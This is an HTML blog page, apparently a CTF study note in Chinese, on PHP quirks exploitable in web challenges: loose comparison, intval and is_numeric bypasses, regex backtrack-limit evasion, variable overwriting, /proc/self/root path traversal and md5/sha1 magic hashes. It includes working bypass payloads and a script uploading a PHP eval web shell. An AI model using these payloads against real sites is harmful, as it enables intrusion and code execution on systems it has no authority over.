@@ -1,0 +1,1233 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="PHP特性, Qiu-lan&#39;s blog">
+    <meta name="description" content="弱类型自动 &amp;#x2F; 强制 类型转换语言特性：PHP 是一个弱类型语言, 变量之间进行比较时, 若两个变量类型不一致, 会先进行强制类型转换，然后再进行比较。
+规则如下：
+
+非数字开头的字符串转换成 int 类型时会变成 0, 数字开头">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>PHP特性 | Qiu-lan&#39;s blog</title>
+    <link rel="icon" type="image/jpeg" href="/qiu%20logo.jpg">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/blog%20logo%20a.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Qiu-lan&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>Contact</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/blog%20logo%20a.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Qiu-lan&#39;s blog</div>
+        <div class="logo-desc">
+            
+            昭昭如愿，岁岁安澜
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">PHP特性</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2025-04-20
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h2><h4 id="自动-强制-类型转换"><a href="#自动-强制-类型转换" class="headerlink" title="自动 &#x2F; 强制 类型转换"></a>自动 &#x2F; 强制 类型转换</h4><p><strong>语言特性</strong>：PHP 是一个弱类型语言, 变量之间进行比较时, 若两个变量类型不一致, 会先进行强制类型转换，然后再进行比较。</p>
+<p>规则如下：</p>
+<ul>
+<li>非数字开头的字符串转换成 int 类型时会变成 0, 数字开头的字符串转换 int 类型后会保留开头的数字</li>
+<li>一个十进制数与十六进制 &#x2F; 八进制数比较时, PHP 会将十六进制 &#x2F; 八进制数转换为十进制数</li>
+<li>string 类型的转换会从最左边开始, 直到遇到非数字的字符时停止</li>
+<li>含 e 的字符串转换成 int 类型时会被当做科学计数法处理, <code>123e456</code> 表示 123 的 456 次方</li>
+<li><code>0e123</code> 表示 0 的 123 次方, 总是等于 0 <code>0e456</code> 同理</li>
+<li>在数字开头加入 <code>\f \t \s \n \r</code> 等同样返回 true</li>
+</ul>
+<h4 id="强弱类型比较"><a href="#强弱类型比较" class="headerlink" title="强弱类型比较"></a>强弱类型比较</h4><p><strong>&#x3D;&#x3D;</strong> 弱类型比较, 仅要求两边变量类型转换后的值相等</p>
+<p><strong>&#x3D;&#x3D;&#x3D;</strong> 强类型比较, 不仅要求两个变量的值相等, 还要求变量的类型相同</p>
+<p>同理 <strong>!&#x3D;</strong> 是弱类型比较, 而 <strong>!&#x3D;&#x3D;</strong> 是强类型比较</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;123&#x27; == 123 // true </span><br><span class="line"></span><br><span class="line">&#x27;123&#x27; === 123 // false</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./php%E7%89%B9%E6%80%A7.assets/image-20250414215823672.png" alt="image-20250414215823672"></p>
+<p><img src="/./php%E7%89%B9%E6%80%A7.assets/image-20250414215903794.png" alt="image-20250414215903794"></p>
+<h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><p>基于获取变量的整数值函数的绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">intval(mixed $value, int $base = 10): int</span><br><span class="line"># eg:</span><br><span class="line">intval(&#x27;0337522&#x27;, 0); # 八进制</span><br><span class="line">intval(&#x27;0x1bf52&#x27;, 0); # 十六进制</span><br><span class="line"># -&gt; 114514</span><br></pre></td></tr></table></figure>
+
+<p>当 <code>$base = 0</code> 时, 通过检测 var（$value） 的格式来决定使用的进制：</p>
+<ul>
+<li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li>
+<li>如果字符串以 “0b” (或 “0B”) 开头，使用 2 进制 (binary)；否则，</li>
+<li>如果字符串以 “0” 开始，使用 8 进制 (octal)；否则，</li>
+<li>将使用 10 进制 (decimal)。</li>
+</ul>
+<p>另：intval 可以取整 (去除小数点后的部分) 和截断 (去除数字后的字符串, 包括科学计数法)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">intval(&#x27;114514.0&#x27;);</span><br><span class="line">intval(&#x27;114514.1&#x27;);</span><br><span class="line">intval(&#x27;114514a&#x27;);</span><br><span class="line">intval(&#x27;114514e123&#x27;);</span><br><span class="line"># -&gt; 114514</span><br></pre></td></tr></table></figure>
+
+<p>eg:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num===&quot;4476&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">八进制表示法：</span><br><span class="line">?num=010574</span><br><span class="line"></span><br><span class="line">010574 是八进制，转换为十进制是 4476</span><br><span class="line">字符串 &quot;010574&quot; 不等于 &quot;4476&quot;</span><br><span class="line"></span><br><span class="line">十六进制表示法：</span><br><span class="line">?num=0x117c</span><br><span class="line"></span><br><span class="line">0x117c 是十六进制，转换为十进制是 4476</span><br><span class="line">字符串 &quot;0x117c&quot; 不等于 &quot;4476&quot;</span><br><span class="line"></span><br><span class="line">科学计数法：</span><br><span class="line">?num=4476e0</span><br><span class="line"></span><br><span class="line">4476e0 转换为整数是 4476</span><br><span class="line">字符串 &quot;4476e0&quot; 不等于 &quot;4476&quot;</span><br><span class="line"></span><br><span class="line">前导空格/特殊字符：</span><br><span class="line">?num=4476%20</span><br><span class="line"></span><br><span class="line">字符串 &quot;4476 &quot; 不等于 &quot;4476&quot;</span><br><span class="line">intval() 会忽略后面的空格</span><br></pre></td></tr></table></figure>
+
+<h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h2><p>正则函数缺陷 </p>
+<h4 id="单行-多行匹配"><a href="#单行-多行匹配" class="headerlink" title="单行 &#x2F; 多行匹配"></a>单行 &#x2F; 多行匹配</h4><p>(URL编码的 <code>%0A</code> 是换行符 <code>\n</code>)</p>
+<p>在正则表达式中，<code>$</code> 是一个特殊字符（锚字符），用于匹配字符串的结尾位置。</p>
+<p>在多行模式下，<code>$</code> 不仅匹配整个字符串的结尾，还匹配每行的结尾（即 <code>\n</code> 或 <code>\r</code> 之前的位置）。</p>
+<p>如果要匹配实际的 <code>$</code> 字符（而不是作为特殊字符），需要使用转义：$</p>
+<h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># ctfshow-web89 正则缺陷</span><br><span class="line"># 利用数组绕过正则匹配，使其返回值发生错误而为false : ?num[]=1</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="正则回溯（没懂）"><a href="#正则回溯（没懂）" class="headerlink" title="正则回溯（没懂）"></a>正则回溯（没懂）</h4><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限</p>
+<p>如何绕过呢，让回溯次数超过最大限制就可以使preg_match()函数返回false，从而绕过限制，中文的回溯次数在100万次就好崩溃，这个回溯保护使PHP为了防止关于正则表达式的DDOS<br>payload:<br>GET:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line"></span><br><span class="line">payload =BytesIO(b&#x27;[]&#x27;+b&#x27;a&#x27;*1000000)</span><br><span class="line">res = requests.get(&#x27;[]?[]=&#x27;+str(payload))</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>POST:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  &#x27;file&#x27;: BytesIO(b&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27; + b&#x27;a&#x27; * 1000000)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(&#x27;http://51.158.75.42:8088/index.php&#x27;, files=files, allow_redirects=False)</span><br><span class="line">print(res.headers)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h2><p>strpos — 查找字符串首次出现的位置</p>
+<p><code>strpos(&#39;01234&#39;, 0)</code> 返回的结果是 0 对应的索引 0, 也就是 false</p>
+<p>如果是 <code>!strpos()</code> 这种则会返回 true</p>
+<p>代码使用了 <code>if(!strpos($str, 0))</code> 对八进制进行过滤, 可以在字符串开头加空格绕过</p>
+<p>strpos() 遇到数组返回 null</p>
+<p>strrpos() stripos() strripos() 同理</p>
+<p><img src="/./php%E7%89%B9%E6%80%A7.assets/image-20250415204317350.png" alt="image-20250415204317350"></p>
+<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h2><p>数字或数字字符串检查函数</p>
+<p>特性：</p>
+<ul>
+<li>可识别科学计数法，如：<code>0123e4567</code> 返回 true</li>
+<li>包含非 e 字母返回 false</li>
+<li>在数字 ** 开头 ** 加入空格 换行符 tab 等特殊字符可以绕过检测</li>
+<li>可以尝试利用 base64 + bin2hex 找到一些只含 e 和数字的 payload</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">is_numeric(&#x27; 36&#x27;); // true</span><br><span class="line">is_numeric(&#x27;36 &#x27;); // false</span><br><span class="line">is_numeric(&#x27;3 6&#x27;); // false</span><br><span class="line">is_numeric(&quot;\n36&quot;); // true</span><br><span class="line">is_numeric(&quot;\t36&quot;); // true</span><br><span class="line">is_numeric(&quot;36\n&quot;); // false</span><br><span class="line">is_numeric(&quot;36\t&quot;); // false</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./php%E7%89%B9%E6%80%A7.assets/image-20250415210640094.png" alt="image-20250415210640094"></p>
+<h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h2><p>is_array() 可以「检测」变量是不是「数组」类型。</p>
+<p>由于 PHP 自动 &#x2F; 强制 类型转换的特性，会将待搜索的值的类型自动转换为数组中的值的类型。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(in_array(&#x27;1abc&#x27;, [1,2,3,4,5])); // true</span><br><span class="line">var_dump(in_array(&#x27;abc&#x27;, [1,2,3,4,5])); // false</span><br><span class="line">var_dump(in_array(&#x27;abc&#x27;, [0,1,2,3,4,5])); // true</span><br></pre></td></tr></table></figure>
+
+<p>注意： is_array() 函数只能判断「普通数组」，不能判断关联数组或多维数组。</p>
+<p>is_array() 只关心变量的「类型」，而不关心里面的「值」；即使里面没有值，也会返回true。</p>
+<p>is_array() 一次只能判断「一个」变量，如果传入多个变量，会报Warning，并且执行结果也不正确。</p>
+<h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h2><p>ereg()限制password的格式，只能是数字或者字母。但ereg()函数存在NULL截断漏洞，可以使用%00绕过验证。</p>
+<p>.**ereg()**函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</p>
+<p>这里ereg有两个漏洞： </p>
+<p>  ①%00截断及遇到%00则默认为字符串的结束</p>
+<p>  ②当ntf为数组时它的返回值不是FALSE</p>
+<h2 id="trim-¶"><a href="#trim-¶" class="headerlink" title="trim()¶"></a>trim()<a target="_blank" rel="noopener" href="https://hello-ctf.com/hc-tags/web/PHP_features/#trim">¶</a></h2><p>不过滤 \f 换页符, url 编码后是 <code>%0c36</code></p>
+<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>几种形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$$key = $$value;</span><br><span class="line"></span><br><span class="line">extract()</span><br><span class="line">parse_str()</span><br><span class="line">import_request_variables()</span><br></pre></td></tr></table></figure>
+
+<p>思路是 <code>$_GET</code> <code>$_POST</code> <code>$_COOKIKE</code> 相互转换</p>
+<p>或者利用 <code>$GLOBALS</code> 输出所有的全局变量</p>
+<p>另外</p>
+<p><strong>parse_str()</strong> 函数把查询字符串解析到变量中。</p>
+<p>注释：<strong>如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</strong></p>
+<p> 即parse_str() 接受数组传参 支持数组内变量覆盖</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_POST[key1]=36d&amp;_POST[key2]=36d</span><br></pre></td></tr></table></figure>
+
+<p> <strong>import_request_variables()</strong></p>
+<p>将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.core.php#ini.register-globals">register_globals</a>，但又想用到一些全局变量，那么此函数就很有用。</p>
+<h2 id="路径穿越"><a href="#路径穿越" class="headerlink" title="路径穿越"></a>路径穿越</h2><p>通过绝对路径 &#x2F; 相对路径绕过正则对文件名的检测, 例如 <code>preg_match(&#39;/flag.php/&#39;, $str)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./flag.php</span><br><span class="line">./ctfshow/../flag.php</span><br><span class="line">/var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
+<p>利用 Linux 下的软链接绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p</span><br><span class="line">roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro</span><br><span class="line">c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/</span><br><span class="line">self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se</span><br><span class="line">lf/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p>php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经<code>require_once(&#39;flag.php&#39;)</code>，已经include的文件不可以再require_once。</p>
+<p>在这里有个小知识点，<code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br><span class="line"></span><br><span class="line">//result PD9waHAKCiRmbGFnPSJ0ZXN0e30iOwo=</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="哈希字符串"><a href="#哈希字符串" class="headerlink" title="哈希字符串"></a>哈希字符串</h2><h3 id="0e-bypass"><a href="#0e-bypass" class="headerlink" title="0e bypass"></a>0e bypass</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&#x27;name&#x27;] != $_GET[&#x27;password&#x27;]</span><br><span class="line">MD5($_GET[&#x27;name&#x27;]) == MD5($_GET[&#x27;password&#x27;])</span><br></pre></td></tr></table></figure>
+
+<p>PHP 在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为 0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么 PHP 将会认为他们相同，都是 0。</p>
+<p>这一点在 md5() &#x2F; sha1() 都适用，以下是可用的 payload：</p>
+<h4 id="md5-0e-payload"><a href="#md5-0e-payload" class="headerlink" title="md5 0e payload"></a>md5 0e payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708 </span><br><span class="line">s878926199a </span><br><span class="line">s155964671a </span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="sha1-0e-payload"><a href="#sha1-0e-payload" class="headerlink" title="sha1 0e payload"></a>sha1 0e payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">```sha1 0e payload</span><br><span class="line"># sha1 0e payload</span><br><span class="line">aaroZmOk</span><br><span class="line">aaK1STfY</span><br><span class="line">aaO8zKZF</span><br><span class="line">aa3OFF9m</span><br><span class="line">0e1290633704</span><br><span class="line">10932435112</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Array-bypass"><a href="#Array-bypass" class="headerlink" title="Array bypass"></a>Array bypass</h3><p>md5 加密数组时返回 null</p>
